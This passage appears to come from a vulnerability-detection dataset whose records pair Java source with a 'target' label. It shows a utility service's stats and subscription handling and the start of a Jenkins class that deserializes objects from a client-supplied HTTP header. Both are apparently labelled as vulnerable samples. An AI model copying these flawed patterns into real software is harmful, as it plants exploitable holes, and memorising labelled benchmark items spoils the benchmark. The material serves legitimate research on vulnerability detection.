statistic\n                op.fail(Operation.STATUS_CODE_UNAVAILABLE);\n                return;\n            }\n            if (this.stats == null) {\n                op.complete();\n                return;\n            }\n            ServiceStat st = this.getStat(STAT_NAME_AVAILABLE, false);\n            if (st == null || st.latestValue == 1.0) {\n                op.complete();\n                return;\n            }\n            op.fail(Operation.STATUS_CODE_UNAVAILABLE);\n        } else if (op.getAction() == Action.PATCH || op.getAction() == Action.PUT) {\n            if (!op.hasBody()) {\n                op.fail(new IllegalArgumentException(\"body is required\"));\n                return;\n            }\n            ServiceStat st = op.getBody(ServiceStat.class);\n            if (!STAT_NAME_AVAILABLE.equals(st.name)) {\n                op.fail(new IllegalArgumentException(\n                        \"body must be of type ServiceStat and name must be \"\n                                + STAT_NAME_AVAILABLE));\n                return;\n            }\n            handleStatsRequest(op);\n        } else {\n            Operation.failActionNotSupported(op);\n        }\n    }\n\n    private void handleSubscriptionsRequest(Operation op) {\n        synchronized (this) {\n            if (this.subscriptions == null) {\n                this.subscriptions = new ServiceSubscriptionState();\n                this.subscriptions.subscribers = new ConcurrentSkipListMap<>();\n            }\n        }\n\n        ServiceSubscriber body = null;\n\n        // validate and populate body for POST & DELETE\n        Action action = op.getAction();\n        if (action == POST || action == DELETE) {\n            if (!op.hasBody()) {\n                op.fail(new IllegalStateException(\"body is required\"));\n                return;\n            }\n            body = op.getBody(ServiceSubscriber.class);\n            if (body.reference == null) {\n                op.fail(new IllegalArgumentException(\"reference is required\"));\n                return;\n            }\n        }\n\n        switch (action) {\n        case POST:\n            // synchronize to avoid concurrent modification during serialization for GET\n            synchronized (this.subscriptions) {\n                this.subscriptions.subscribers.put(body.reference, body);\n            }\n            if (!body.replayState) {\n                break;\n            }\n            // if replayState is set, replay the current state to the subscriber\n            URI notificationURI = body.reference;\n            this.parent.sendRequest(Operation.createGet(this, this.parent.getSelfLink())\n                    .setCompletion(\n                            (o, e) -> {\n                                if (e != null) {\n                                    op.fail(new IllegalStateException(\n                                            \"Unable to get current state\"));\n                                    return;\n                                }\n                                Operation putOp = Operation\n                                        .createPut(notificationURI)\n                                        .setBodyNoCloning(o.getBody(this.parent.getStateType()))\n                                        .addPragmaDirective(\n                                                Operation.PRAGMA_DIRECTIVE_NOTIFICATION)\n                                        .setReferer(getUri());\n                                this.parent.sendRequest(putOp);\n                            }));\n\n            break;\n        case DELETE:\n            // synchronize to avoid concurrent modification during serialization for GET\n            synchronized (this.subscriptions) {\n                this.subscriptions.subscribers.remove(body.reference);\n            }\n            break;\n        case GET:\n            ServiceDocument rsp;\n            synchronized (this.subscriptions) {\n                rsp = Utils.clone(this.subscriptions);\n            }\n            op.setBody(rsp);\n            break;\n        default:\n            op.fail(new NotActiveException());\n            break;\n\n        }\n\n        op.complete();\n    }\n\n    public boolean hasSubscribers() {\n        ServiceSubscriptionState subscriptions = this.subscriptions;\n        return subscriptions != null\n                && subscriptions.subscribers != null\n                && !subscriptions.subscribers.isEmpty();\n    }\n\n    public boolean hasStats() {\n        ServiceStats stats = this.stats;\n        return stats != null && stats.entries != null && !stats.entries.isEmpty();\n    }\n\n    public void notifySubscribers(Operation op) {\n        try {\n            if (op.getAction() == Action.GET) {\n                return;\n            }\n\n            if (!this.hasSubscribers()) {\n                return;\n            }\n\n            long now = Utils.getNowMicrosUtc();\n\n            Operation clone = op.clone();\n            clone.toggleOption(OperationOption.REMOTE, false);\n            clone.addPragmaDirective(Operation.PRAGMA_DIRECTIVE_NOTIFICATION);\n            for (Entry<URI, ServiceSubscriber> e : this.subscriptions.subscribers.entrySet()) {\n                ServiceSubscriber s = e.getValue();\n                notifySubscriber(now, clone, s);\n            }\n\n            if (!performSubscriptionsMaintenance(now)) {\n                return;\n            }\n        } catch (Throwable e) {\n            this.parent.getHost().log(Level.WARNING,\n                    \"Uncaught exception notifying subscribers for %s: %s\",\n                    this.parent.getSelfLink(), Utils.toString(e));\n        }\n    }\n\n    private void notifySubscriber(long now, Operation clone, ServiceSubscriber s) {\n        synchronized (s) {\n            if (s.failedNotificationCount != null) {\n                // indicate to the subscriber that they missed notifications and should retrieve latest state\n                clone.addPragmaDirective(Operation.PRAGMA_DIRECTIVE_SKIPPED_NOTIFICATIONS);\n            }\n        }\n\n        CompletionHandler c = (o, ex) -> {\n            s.documentUpdateTimeMicros = Utils.getNowMicrosUtc();\n            synchronized (s) {\n                if (ex != null) {\n                    if (s.failedNotificationCount == null) {\n                        s.failedNotificationCount = 0L;\n                        s.initialFailedNotificationTimeMicros = now;\n                    }\n                    s.failedNotificationCount++;\n                    return;\n                }\n\n                if (s.failedNotificationCount != null) {\n                    // the subscriber is available again.\n                    s.failedNotificationCount = null;\n                    s.initialFailedNotificationTimeMicros = null;\n                }\n            }\n        };\n\n        this.parent.sendRequest(clone.setUri(s.reference).setCompletion(c));\n    }\n\n    private boolean performSubscriptionsMaintenance(long now) {\n        List<URI> subscribersToDelete = null;\n        synchronized (this) {\n            if (this.subscriptions == null) {\n                return false;\n            }\n\n            Iterator<Entry<URI, ServiceSubscriber>> it = this.subscriptions.subscribers.entrySet()\n                    .iterator();\n            while (it.hasNext()) {\n                Entry<URI, ServiceSubscriber> e = it.next();\n                ServiceSubscriber s = e.getValue();\n                boolean remove = false;\n                synchronized (s) {\n                    if (s.documentExpirationTimeMicros != 0 && s.documentExpirationTimeMicros < now) {\n                        remove = true;\n                    } else if (s.notificationLimit != null) {\n                        if (s.notificationCount == null) {\n                            s.notificationCount = 0L;\n                        }\n                        if (++s.notificationCount >= s.notificationLimit) {\n                            remove = true;\n                        }\n                    } else if (s.failedNotificationCount != null\n                            && s.failedNotificationCount > ServiceSubscriber.NOTIFICATION_FAILURE_LIMIT) {\n                        if (now - s.initialFailedNotificationTimeMicros > getHost()\n                                .getMaintenanceIntervalMicros()) {\n                            getHost().log(Level.INFO,\n                                    \"removing subscriber, failed notifications: %d\",\n                                    s.failedNotificationCount);\n                            remove = true;\n                        }\n                    }\n                }\n\n                if (!remove) {\n                    continue;\n                }\n\n                it.remove();\n                if (subscribersToDelete == null) {\n                    subscribersToDelete = new ArrayList<>();\n                }\n                subscribersToDelete.add(s.reference);\n                continue;\n            }\n        }\n\n        if (subscribersToDelete != null) {\n            for (URI subscriber : subscribersToDelete) {\n                this.parent.sendRequest(Operation.createDelete(subscriber));\n            }\n        }\n\n        return true;\n    }\n\n    private void handleUiRequest(Operation op) {\n        if (op.getAction() != Action.GET) {\n            op.fail(new IllegalArgumentException(\"Action not supported\"));\n            return;\n        }\n\n        if (!this.parent.hasOption(ServiceOption.HTML_USER_INTERFACE)) {\n            String servicePath = UriUtils.buildUriPath(ServiceUriPaths.UI_SERVICE_BASE_URL, op\n                    .getUri().getPath());\n            String defaultHtmlPath = UriUtils.buildUriPath(servicePath.substring(0,\n                    servicePath.length() - ServiceUriPaths.UI_PATH_SUFFIX.length()),\n                    ServiceUriPaths.UI_SERVICE_HOME);\n\n            redirectGetToHtmlUiResource(op, defaultHtmlPath);\n            return;\n        }\n\n        if (this.uiService == null) {\n            this.uiService = new UiContentService() {\n            };\n            this.uiService.setHost(this.parent.getHost());\n        }\n\n        // simulate a full service deployed at the utility endpoint /service/ui\n        String selfLink = this.parent.getSelfLink() + ServiceHost.SERVICE_URI_SUFFIX_UI;\n        this.uiService.handleUiGet(selfLink, this.parent, op);\n    }\n\n    public void redirectGetToHtmlUiResource(Operation op, String htmlResourcePath) {\n        // redirect using relative url without host:port\n        // not so much optimization as handling the case of port forwarding/containers\n        try {\n            op.addResponseHeader(Operation.LOCATION_HEADER,\n                    URLDecoder.decode(htmlResourcePath, Utils.CHARSET));\n        } catch (UnsupportedEncodingException e) {\n            throw new IllegalStateException(e);\n        }\n\n        op.setStatusCode(Operation.STATUS_CODE_MOVED_TEMP);\n        op.complete();\n    }\n\n    private void handleStatsRequest(Operation op) {\n        switch (op.getAction()) {\n        case PUT:\n            ServiceStats.ServiceStat stat = op\n                    .getBody(ServiceStats.ServiceStat.class);\n            if (stat.kind == null) {\n                op.fail(new IllegalArgumentException(\"kind is required\"));\n                return;\n            }\n            if (stat.kind.equals(ServiceStats.ServiceStat.KIND)) {\n                if (stat.name == null) {\n                    op.fail(new IllegalArgumentException(\"stat name is required\"));\n                    return;\n                }\n                replaceSingleStat(stat);\n            } else if (stat.kind.equals(ServiceStats.KIND)) {\n                ServiceStats stats = op.getBody(ServiceStats.class);\n                if (stats.entries == null || stats.entries.isEmpty()) {\n                    op.fail(new IllegalArgumentException(\"stats entries need to be defined\"));\n                    return;\n                }\n                replaceAllStats(stats);\n            } else {\n                op.fail(new IllegalArgumentException(\"operation not supported for kind\"));\n                return;\n            }\n            op.complete();\n            break;\n        case POST:\n            ServiceStats.ServiceStat newStat = op.getBody(ServiceStats.ServiceStat.class);\n            if (newStat.name == null) {\n                op.fail(new IllegalArgumentException(\"stat name is required\"));\n                return;\n            }\n            // create a stat object if one does not exist\n            ServiceStats.ServiceStat existingStat = this.getStat(newStat.name);\n            if (existingStat == null) {\n                op.fail(new IllegalArgumentException(\"stat does not exist\"));\n                return;\n            }\n            initializeOrSetStat(existingStat, newStat);\n            op.complete();\n            break;\n        case DELETE:\n            // TODO support removing stats externally - do we need this?\n            op.fail(new NotActiveException());\n            break;\n        case PATCH:\n            newStat = op.getBody(ServiceStats.ServiceStat.class);\n            if (newStat.name == null) {\n                op.fail(new IllegalArgumentException(\"stat name is required\"));\n                return;\n            }\n            // if an existing stat by this name exists, adjust the stat value, else this is a no-op\n            existingStat = this.getStat(newStat.name, false);\n            if (existingStat == null) {\n                op.fail(new IllegalArgumentException(\"stat to patch does not exist\"));\n                return;\n            }\n            adjustStat(existingStat, newStat.latestValue);\n            op.complete();\n            break;\n        case GET:\n            if (this.stats == null) {\n                ServiceStats s = new ServiceStats();\n                populateDocumentProperties(s);\n                op.setBody(s).complete();\n            } else {\n                ServiceStats rsp;\n                synchronized (this.stats) {\n                    rsp = populateDocumentProperties(this.stats);\n                    rsp = Utils.clone(rsp);\n                }\n\n                if (handleStatsGetWithODataRequest(op, rsp)) {\n                    return;\n                }\n\n                op.setBodyNoCloning(rsp);\n                op.complete();\n            }\n            break;\n        default:\n            op.fail(new NotActiveException());\n            break;\n\n        }\n    }\n\n    /**\n     * Selects statistics entries that satisfy a simple sub set of ODATA filter expressions\n     */\n    private boolean handleStatsGetWithODataRequest(Operation op, ServiceStats rsp) {\n        if (UriUtils.getODataCountParamValue(op.getUri())) {\n            op.fail(new IllegalArgumentException(\n                    UriUtils.URI_PARAM_ODATA_COUNT + \" is not supported\"));\n            return true;\n        }\n\n        if (UriUtils.getODataOrderByParamValue(op.getUri()) != null) {\n            op.fail(new IllegalArgumentException(\n                    UriUtils.URI_PARAM_ODATA_ORDER_BY + \" is not supported\"));\n            return true;\n        }\n\n        if (UriUtils.getODataSkipToParamValue(op.getUri()) != null) {\n            op.fail(new IllegalArgumentException(\n                    UriUtils.URI_PARAM_ODATA_SKIP_TO + \" is not supported\"));\n            return true;\n        }\n\n        if (UriUtils.getODataTopParamValue(op.getUri()) != null) {\n            op.fail(new IllegalArgumentException(\n                    UriUtils.URI_PARAM_ODATA_TOP + \" is not supported\"));\n            return true;\n        }\n\n        if (UriUtils.getODataFilterParamValue(op.getUri()) == null) {\n            return false;\n        }\n\n        QueryTask task = ODataUtils.toQuery(op, false, null);\n        if (task == null || task.querySpec.query == null) {\n            return false;\n        }\n\n        List<Query> clauses = task.querySpec.query.booleanClauses;\n        if (clauses == null || clauses.size() == 0) {\n            clauses = new ArrayList<Query>();\n            if (task.querySpec.query.term == null) {\n                return false;\n            }\n            clauses.add(task.querySpec.query);\n        }\n\n        return processStatsODataQueryClauses(op, rsp, clauses);\n    }\n\n    private boolean processStatsODataQueryClauses(Operation op, ServiceStats rsp,\n            List<Query> clauses) {\n        for (Query q : clauses) {\n            if (!Occurance.MUST_OCCUR.equals(q.occurance)) {\n                op.fail(new IllegalArgumentException(\"only AND expressions are supported\"));\n                return true;\n            }\n\n            QueryTerm term = q.term;\n\n            if (term == null) {\n                return processStatsODataQueryClauses(op, rsp, q.booleanClauses);\n            }\n\n            // prune entries using the filter match value and property\n            Iterator<Entry<String, ServiceStat>> statIt = rsp.entries.entrySet().iterator();\n            while (statIt.hasNext()) {\n                Entry<String, ServiceStat> e = statIt.next();\n                if (ServiceStat.FIELD_NAME_NAME.equals(term.propertyName)) {\n                    // match against the name property which is the also the key for the\n                    // entry table\n                    if (term.matchType.equals(MatchType.TERM)\n                            && e.getKey().equals(term.matchValue)) {\n                        continue;\n                    }\n                    if (term.matchType.equals(MatchType.PREFIX)\n                            && e.getKey().startsWith(term.matchValue)) {\n                        continue;\n                    }\n                    if (term.matchType.equals(MatchType.WILDCARD)) {\n                        // we only support two types of wild card queries:\n                        // *something or something*\n                        if (term.matchValue.endsWith(UriUtils.URI_WILDCARD_CHAR)) {\n                            // prefix match\n                            String mv = term.matchValue.replace(UriUtils.URI_WILDCARD_CHAR, \"\");\n                            if (e.getKey().startsWith(mv)) {\n                                continue;\n                            }\n                        } else if (term.matchValue.startsWith(UriUtils.URI_WILDCARD_CHAR)) {\n                            // suffix match\n                            String mv = term.matchValue.replace(UriUtils.URI_WILDCARD_CHAR, \"\");\n\n                            if (e.getKey().endsWith(mv)) {\n                                continue;\n                            }\n                        }\n                    }\n                } else if (ServiceStat.FIELD_NAME_LATEST_VALUE.equals(term.propertyName)) {\n                    // support numeric range queries on latest value\n                    if (term.range == null || term.range.type != TypeName.DOUBLE) {\n                        op.fail(new IllegalArgumentException(\n                                ServiceStat.FIELD_NAME_LATEST_VALUE\n                                        + \"requires double numeric range\"));\n                        return true;\n                    }\n                    @SuppressWarnings(\"unchecked\")\n                    NumericRange<Double> nr = (NumericRange<Double>) term.range;\n                    ServiceStat st = e.getValue();\n                    boolean withinMax = nr.isMaxInclusive && st.latestValue <= nr.max ||\n                            st.latestValue < nr.max;\n                    boolean withinMin = nr.isMinInclusive && st.latestValue >= nr.min ||\n                            st.latestValue > nr.min;\n                    if (withinMin && withinMax) {\n                        continue;\n                    }\n                }\n                statIt.remove();\n            }\n        }\n        return false;\n    }\n\n    private ServiceStats populateDocumentProperties(ServiceStats stats) {\n        ServiceStats clone = new ServiceStats();\n        // sort entries by key (natural ordering)\n        clone.entries = new TreeMap<>(stats.entries);\n        clone.documentUpdateTimeMicros = stats.documentUpdateTimeMicros;\n        clone.documentSelfLink = UriUtils.buildUriPath(this.parent.getSelfLink(),\n                ServiceHost.SERVICE_URI_SUFFIX_STATS);\n        clone.documentOwner = getHost().getId();\n        clone.documentKind = Utils.buildKind(ServiceStats.class);\n        return clone;\n    }\n\n    private void handleDocumentTemplateRequest(Operation op) {\n        if (op.getAction() != Action.GET) {\n            op.fail(new NotActiveException());\n            return;\n        }\n        ServiceDocument template = this.parent.getDocumentTemplate();\n        String serializedTemplate = Utils.toJsonHtml(template);\n        op.setBody(serializedTemplate).complete();\n    }\n\n    @Override\n    public void handleConfigurationRequest(Operation op) {\n        this.parent.handleConfigurationRequest(op);\n    }\n\n    public void handlePatchConfiguration(Operation op, ServiceConfigUpdateRequest updateBody) {\n        if (updateBody == null) {\n            updateBody = op.getBody(ServiceConfigUpdateRequest.class);\n        }\n\n        if (!ServiceConfigUpdateRequest.KIND.equals(updateBody.kind)) {\n            op.fail(new IllegalArgumentException(\"Unrecognized kind: \" + updateBody.kind));\n            return;\n        }\n\n        if (updateBody.maintenanceIntervalMicros == null\n                && updateBody.peerNodeSelectorPath == null\n                && updateBody.operationQueueLimit == null\n                && updateBody.epoch == null\n                && (updateBody.addOptions == null || updateBody.addOptions.isEmpty())\n                && (updateBody.removeOptions == null || updateBody.removeOptions\n                .isEmpty())\n                && updateBody.versionRetentionLimit == null) {\n            op.fail(new IllegalArgumentException(\n                    \"At least one configuraton field must be specified\"));\n            return;\n        }\n\n        if (updateBody.versionRetentionLimit != null) {\n            // Fail the request for immutable service as it is not allowed to change the version\n            // retention.\n            if (this.parent.getOptions().contains(ServiceOption.IMMUTABLE)) {\n                op.fail(new IllegalArgumentException(String.format(\n                        \"Service %s has option %s, retention limit cannot be modified\",\n                        this.parent.getSelfLink(), ServiceOption.IMMUTABLE)));\n                return;\n            }\n            ServiceDocumentDescription serviceDocumentDescription = this.parent\n                    .getDocumentTemplate().documentDescription;\n            serviceDocumentDescription.versionRetentionLimit = updateBody.versionRetentionLimit;\n            if (updateBody.versionRetentionFloor != null) {\n                serviceDocumentDescription.versionRetentionFloor = updateBody.versionRetentionFloor;\n            } else {\n                serviceDocumentDescription.versionRetentionFloor =\n                        updateBody.versionRetentionLimit / 2;\n            }\n        }\n\n        // service might fail a capability toggle if the capability can not be changed after start\n        if (updateBody.addOptions != null) {\n            for (ServiceOption c : updateBody.addOptions) {\n                this.parent.toggleOption(c, true);\n            }\n        }\n\n        if (updateBody.removeOptions != null) {\n            for (ServiceOption c : updateBody.removeOptions) {\n                this.parent.toggleOption(c, false);\n            }\n        }\n\n        if (updateBody.maintenanceIntervalMicros != null) {\n            this.parent.setMaintenanceIntervalMicros(updateBody.maintenanceIntervalMicros);\n        }\n\n        if (updateBody.peerNodeSelectorPath != null) {\n            this.parent.setPeerNodeSelectorPath(updateBody.peerNodeSelectorPath);\n        }\n\n        op.complete();\n    }\n\n    private void initializeOrSetStat(ServiceStat stat, ServiceStat newValue) {\n        synchronized (stat) {\n            if (stat.timeSeriesStats == null && newValue.timeSeriesStats != null) {\n                stat.timeSeriesStats = new TimeSeriesStats(newValue.timeSeriesStats.numBins,\n                        newValue.timeSeriesStats.binDurationMillis, newValue.timeSeriesStats.aggregationType);\n            }\n            stat.unit = newValue.unit;\n            stat.sourceTimeMicrosUtc = newValue.sourceTimeMicrosUtc;\n            setStat(stat, newValue.latestValue);\n        }\n    }\n\n    @Override\n    public void setStat(ServiceStat stat, double newValue) {\n        allocateStats();\n        findStat(stat.name, true, stat);\n        synchronized (stat) {\n            stat.version++;\n            stat.accumulatedValue += newValue;\n            stat.latestValue = newValue;\n            if (stat.logHistogram != null) {\n                int binIndex = 0;\n                if (newValue > 0.0) {\n                    binIndex = (int) Math.log10(newValue);\n                }\n                if (binIndex >= 0 && binIndex < stat.logHistogram.bins.length) {\n                    stat.logHistogram.bins[binIndex]++;\n                }\n            }\n            stat.lastUpdateMicrosUtc = Utils.getNowMicrosUtc();\n            if (stat.timeSeriesStats != null) {\n                if (stat.sourceTimeMicrosUtc != null) {\n                    stat.timeSeriesStats.add(stat.sourceTimeMicrosUtc, newValue, newValue);\n                } else {\n                    stat.timeSeriesStats.add(stat.lastUpdateMicrosUtc, newValue, newValue);\n                }\n            }\n        }\n    }\n\n    @Override\n    public void adjustStat(ServiceStat stat, double delta) {\n        allocateStats();\n        synchronized (stat) {\n            stat.latestValue += delta;\n            stat.version++;\n            if (stat.logHistogram != null) {\n                int binIndex = 0;\n                if (delta > 0.0) {\n                    binIndex = (int) Math.log10(delta);\n                }\n                if (binIndex >= 0 && binIndex < stat.logHistogram.bins.length) {\n                    stat.logHistogram.bins[binIndex]++;\n                }\n            }\n            stat.lastUpdateMicrosUtc = Utils.getNowMicrosUtc();\n            if (stat.timeSeriesStats != null) {\n                if (stat.sourceTimeMicrosUtc != null) {\n                    stat.timeSeriesStats.add(stat.sourceTimeMicrosUtc, stat.latestValue, delta);\n                } else {\n                    stat.timeSeriesStats.add(stat.lastUpdateMicrosUtc, stat.latestValue, delta);\n                }\n            }\n        }\n    }\n\n    @Override\n    public ServiceStat getStat(String name) {\n        return getStat(name, true);\n    }\n\n    private ServiceStat getStat(String name, boolean create) {\n        if (!allocateStats(true)) {\n            return null;\n        }\n        return findStat(name, create, null);\n    }\n\n    private void replaceSingleStat(ServiceStat stat) {\n        if (!allocateStats(true)) {\n            return;\n        }\n        synchronized (this.stats) {\n            // create a new stat with the default values\n            ServiceStat newStat = new ServiceStat();\n            newStat.name = stat.name;\n            initializeOrSetStat(newStat, stat);\n            if (this.stats.entries == null) {\n                this.stats.entries = new HashMap<>();\n            }\n            // add it to the list of stats for this service\n            this.stats.entries.put(stat.name, newStat);\n        }\n    }\n\n    private void replaceAllStats(ServiceStats newStats) {\n        if (!allocateStats(true)) {\n            return;\n        }\n        synchronized (this.stats) {\n            // reset the current set of stats\n            this.stats.entries.clear();\n            for (ServiceStats.ServiceStat currentStat : newStats.entries.values()) {\n                replaceSingleStat(currentStat);\n            }\n\n        }\n    }\n\n    private ServiceStat findStat(String name, boolean create, ServiceStat initialStat) {\n        synchronized (this.stats) {\n            if (this.stats.entries == null) {\n                this.stats.entries = new HashMap<>();\n            }\n            ServiceStat st = this.stats.entries.get(name);\n            if (st == null && create) {\n                st = initialStat != null ? initialStat : new ServiceStat();\n                name = name.intern();\n                st.name = name;\n                this.stats.entries.put(name, st);\n            }\n\n            if (create && st != null && initialStat != null) {\n                // if the statistic already exists make sure it has the same features\n                // as the statistic we are trying to create\n                if (st.timeSeriesStats == null && initialStat.timeSeriesStats != null) {\n                    st.timeSeriesStats = initialStat.timeSeriesStats;\n                }\n                if (st.logHistogram == null && initialStat.logHistogram != null) {\n                    st.logHistogram = initialStat.logHistogram;\n                }\n            }\n            return st;\n        }\n    }\n\n    private void allocateStats() {\n        allocateStats(true);\n    }\n\n    private synchronized boolean allocateStats(boolean mustAllocate) {\n        if (!mustAllocate && this.stats == null) {\n            return false;\n        }\n        if (this.stats != null) {\n            return true;\n        }\n        this.stats = new ServiceStats();\n        return true;\n    }\n\n    @Override\n    public ServiceHost getHost() {\n        return this.parent.getHost();\n    }\n\n    @Override\n    public String getSelfLink() {\n        return null;\n    }\n\n    @Override\n    public URI getUri() {\n        return null;\n    }\n\n    @Override\n    public OperationProcessingChain getOperationProcessingChain() {\n        return null;\n    }\n\n    @Override\n    public ProcessingStage getProcessingStage() {\n        return ProcessingStage.AVAILABLE;\n    }\n\n    @Override\n    public EnumSet<ServiceOption> getOptions() {\n        return EnumSet.of(ServiceOption.UTILITY);\n    }\n\n    @Override\n    public boolean hasOption(ServiceOption cap) {\n        return false;\n    }\n\n    @Override\n    public void toggleOption(ServiceOption cap, boolean enable) {\n        throw new RuntimeException();\n    }\n\n    @Override\n    public void adjustStat(String name, double delta) {\n        return;\n    }\n\n    @Override\n    public void setStat(String name, double newValue) {\n        return;\n    }\n\n    @Override\n    public void handleMaintenance(Operation post) {\n        post.complete();\n    }\n\n    @Override\n    public void setHost(ServiceHost serviceHost) {\n\n    }\n\n    @Override\n    public void setSelfLink(String path) {\n\n    }\n\n    @Override\n    public void setOperationProcessingChain(OperationProcessingChain opProcessingChain) {\n\n    }\n\n    @Override\n    public ServiceRuntimeContext setProcessingStage(ProcessingStage initialized) {\n        return null;\n    }\n\n    @Override\n    public ServiceDocument setInitialState(Object state, Long initialVersion) {\n        return null;\n    }\n\n    @Override\n    public Service getUtilityService(String uriPath) {\n        return null;\n    }\n\n    @Override\n    public boolean queueRequest(Operation op) {\n        return false;\n    }\n\n    @Override\n    public void sendRequest(Operation op) {\n        throw new RuntimeException();\n    }\n\n    @Override\n    public ServiceDocument getDocumentTemplate() {\n        return null;\n    }\n\n    @Override\n    public void setPeerNodeSelectorPath(String uriPath) {\n\n    }\n\n    @Override\n    public String getPeerNodeSelectorPath() {\n        return null;\n    }\n\n    @Override\n    public void setDocumentIndexPath(String uriPath) {\n\n    }\n\n    @Override\n    public String getDocumentIndexPath() {\n        return null;\n    }\n\n    @Override\n    public void setState(Operation op, ServiceDocument newState) {\n        op.linkState(newState);\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    @Override\n    public <T extends ServiceDocument> T getState(Operation op) {\n        return (T) op.getLinkedState();\n    }\n\n    @Override\n    public void setMaintenanceIntervalMicros(long micros) {\n        throw new RuntimeException(\"not implemented\");\n    }\n\n    @Override\n    public long getMaintenanceIntervalMicros() {\n        return 0;\n    }\n\n    @Override\n    public Operation dequeueRequest() {\n        return null;\n    }\n\n    @Override\n    public Class<? extends ServiceDocument> getStateType() {\n        return null;\n    }\n\n    @Override\n    public final void setAuthorizationContext(Operation op, AuthorizationContext ctx) {\n        throw new RuntimeException(\"Service not allowed to set authorization context\");\n    }\n\n    @Override\n    public final AuthorizationContext getSystemAuthorizationContext() {\n        throw new RuntimeException(\"Service not allowed to get system authorization context\");\n    }\n}\n", "target": 1}
{"idx": 1067, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2004-2010, Sun Microsystems, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.console;\n\nimport com.trilead.ssh2.crypto.Base64;\nimport jenkins.model.Jenkins;\nimport hudson.remoting.ObjectInputStreamEx;\nimport hudson.util.IOException2;\nimport hudson.util.Secret;\nimport hudson.util.TimeUnit2;\nimport jenkins.security.CryptoConfidentialKey;\nimport org.apache.commons.io.output.ByteArrayOutputStream;\nimport org.kohsuke.stapler.Stapler;\nimport org.kohsuke.stapler.StaplerRequest;\nimport org.kohsuke.stapler.StaplerResponse;\nimport org.kohsuke.stapler.framework.io.ByteBuffer;\nimport org.kohsuke.stapler.framework.io.LargeText;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.CipherInputStream;\nimport javax.crypto.CipherOutputStream;\nimport java.io.ByteArrayInputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.OutputStream;\nimport java.io.Writer;\nimport java.nio.charset.Charset;\nimport java.security.GeneralSecurityException;\nimport java.util.zip.GZIPInputStream;\nimport java.util.zip.GZIPOutputStream;\n\nimport static java.lang.Math.abs;\n\n/**\n * Extension to {@link LargeText} that handles annotations by {@link ConsoleAnnotator}.\n *\n * <p>\n * In addition to run each line through {@link ConsoleAnnotationOutputStream} for adding markup,\n * this class persists {@link ConsoleAnnotator} into a byte sequence and send it to the client\n * as an HTTP header. The client JavaScript sends it back next time it fetches the following output.\n *\n * <p>\n * The serialized {@link ConsoleAnnotator} is encrypted to avoid malicious clients from instantiating\n * arbitrary {@link ConsoleAnnotator}s.\n *\n * @param <T>\n *      Context type.\n * @author Kohsuke Kawaguchi\n * @since 1.349\n */\npublic class AnnotatedLargeText<T> extends LargeText {\n    /**\n     * Can be null.\n     */\n    private T context;\n\n    public AnnotatedLargeText(File file, Charset charset, boolean completed, T context) {\n        super(file, charset, completed);\n        this.context = context;\n    }\n\n    public AnnotatedLargeText(ByteBuffer memory, Charset charset, boolean completed, T context) {\n        super(memory, charset, completed);\n        this.context = context;\n    }\n\n    public void doProgressiveHtml(StaplerRequest req, StaplerResponse rsp) throws IOException {\n        req.setAttribute(\"html\",true);\n        doProgressText(req,rsp);\n    }\n\n    /**\n     * Aliasing what I think was a wrong name in {@link LargeText}\n     */\n    public void doProgressiveText(StaplerRequest req, StaplerResponse rsp) throws IOException {\n        doProgressText(req,rsp);\n    }\n\n    /**\n     * For reusing code between text/html and text/plain, we run them both through the same code path\n     * and use this request attribute to differentiate. \n     */\n    private boolean isHtml() {\n        StaplerRequest req = Stapler.getCurrentRequest();\n        return req!=null && req.getAttribute(\"html\")!=null;\n    }\n\n    @Override\n    protected void setContentType(StaplerResponse rsp) {\n        rsp.setContentType(isHtml() ? \"text/html;charset=UTF-8\" : \"text/plain;charset=UTF-8\");\n    }\n\n    private ConsoleAnnotator createAnnotator(StaplerRequest req) throws IOException {\n        try {\n            String base64 = req!=null ? req.getHeader(\"X-ConsoleAnnotator\") : null;\n            if (base64!=null) {\n                Cipher sym = PASSING_ANNOTATOR.decrypt();\n\n                ObjectInputStream ois = new ObjectInputStreamEx(new GZIPInputStream(\n                        new CipherInputStream(new ByteArrayInputStream(Base64.decode(base64.toCharArray())),sym)),\n                        Jenkins.getInstance().pluginManager.uberClassLoader);\n                try {\n                    long timestamp = ois.readLong();\n                    if (TimeUnit2.HOURS.toMillis(1) > abs(System.currentTimeMillis()-timestamp))\n                        // don't deserialize something too old to prevent a replay attack\n                        return (ConsoleAnnotator)ois.readObject();\n                } finally {\n                    ois.close();\n                }\n            }\n        } catch (ClassNotFoundException e) {\n            throw new IOException2(e);\n        }\n        // start from scratch\n        return ConsoleAnnotator.initial(context==null ? null : context.getClass());\n    }\n\n    @Override\n    public long writeLogTo(long start, Writer w) throws IOException {\n        if (isHtml())\n            return writeHtmlTo(start, w);\n        else\n            return super.writeLogTo(start,w);\n    }\n\n    @Override\n    public long writeLogTo(long start, OutputStream out) throws IOException {\n        return super.writeLogTo(start, new PlainTextConsoleOutputStream(out));\n    }\n\n    public long writeHtmlTo(long start, Writer w) throws IOException {\n        ConsoleAnnotationOutputStream caw = new ConsoleAnnotationOutputStream(\n                w, createAnnotator(Stapler.getCurrentRequest()), context, charset);\n        long r = super.writeLogTo(start,caw);\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        